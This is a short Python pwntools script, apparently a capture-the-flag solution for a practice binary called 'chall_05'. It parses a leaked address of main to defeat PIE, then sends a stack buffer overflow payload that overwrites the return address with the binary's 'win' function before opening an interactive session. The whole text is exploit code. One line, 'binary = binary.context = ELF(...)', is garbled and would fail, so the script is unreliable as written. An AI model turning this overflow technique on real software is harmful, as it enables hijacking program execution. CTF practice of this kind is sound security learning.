from pwn import *
p = process('./chall_05')
binary = binary.context = ELF('./chall_05')
p.recvline()
p.recvuntil('I wonder what this is: ')
main = 0x011c0
_ = p.recvline().strip()
leak = int(_,16)
binary.address = leak-main
winaddr = binary.sym.win
payload = b"A"*(0x60 - 0x8) + p64(winaddr)
p.sendline(payload)
p.interactive()
